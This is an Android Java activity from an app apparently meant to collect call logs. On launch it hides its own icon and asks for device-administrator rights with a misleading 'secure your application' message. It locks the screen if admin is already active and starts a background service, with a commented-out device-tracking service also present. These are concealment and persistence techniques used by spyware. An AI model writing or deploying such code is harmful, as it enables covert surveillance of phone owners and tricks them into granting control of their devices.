package com.pgbsolution.calllogsdemo;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE = 0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
//        startService(new Intent(this, StartService.class));

        try {
            // Initiate DevicePolicyManager.
            DevicePolicyManager mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName mAdminName = new ComponentName(this, DeviceAdminReciever.class);

            if (!mDPM.isAdminActive(mAdminName)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
                startActivityForResult(intent, REQUEST_CODE);
            } else {
                mDPM.lockNow();
                finish();
//                 Intent intent = new Intent(MainActivity.this,
//                 TrackDeviceService.class);
//                 startService(intent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (REQUEST_CODE == requestCode) {
            startService(new Intent(MainActivity.this, StartService.class));
            finish();
        }
//        super.onActivityResult(requestCode, resultCode, data);
    }
}